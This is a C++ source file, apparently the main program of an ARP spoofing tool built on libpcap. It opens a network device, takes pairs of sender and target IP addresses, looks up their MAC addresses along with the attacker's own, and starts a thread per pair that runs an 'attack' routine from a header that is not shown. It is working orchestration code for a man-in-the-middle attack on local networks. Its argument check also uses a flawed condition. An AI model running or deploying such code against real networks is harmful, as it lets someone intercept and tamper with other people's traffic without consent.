#include <iostream>
#include <pcap.h>
#include <thread>
#include <vector>
#include "arp_spoof.h"
#include <stdlib.h>

using namespace std;

int main(int argc, char** argv)
{
    if ((argc < 4) && (argc % 2 != 0))  //validating arguments
    {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, PCAP_BUF_SIZE, 1, 1000, errbuf);          //handle
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    vector<thread> sessions;    //create thread

    for (int i = 2, idx = 0; i < argc; i += 2, idx++)
    {
        argues arguments;
        arguments.fp = handle;
        get_attacker_mac(dev, arguments.host_mac);

        convert_argv_into_ip(arguments.sender_IP, argv[i]);
        convert_argv_into_ip(arguments.target_IP, argv[i+1]);
        get_node_MAC(handle, arguments.host_mac, arguments.sender_IP, arguments.sender_mac);
        get_node_MAC(handle, arguments.host_mac, arguments.target_IP, arguments.target_mac);

        sessions.emplace_back(thread(attack, arguments));

    }
    for(int i = 0; i < (argc-2) / 2; i++)
    {
        sessions[i].join();
    }
    return 0;
}
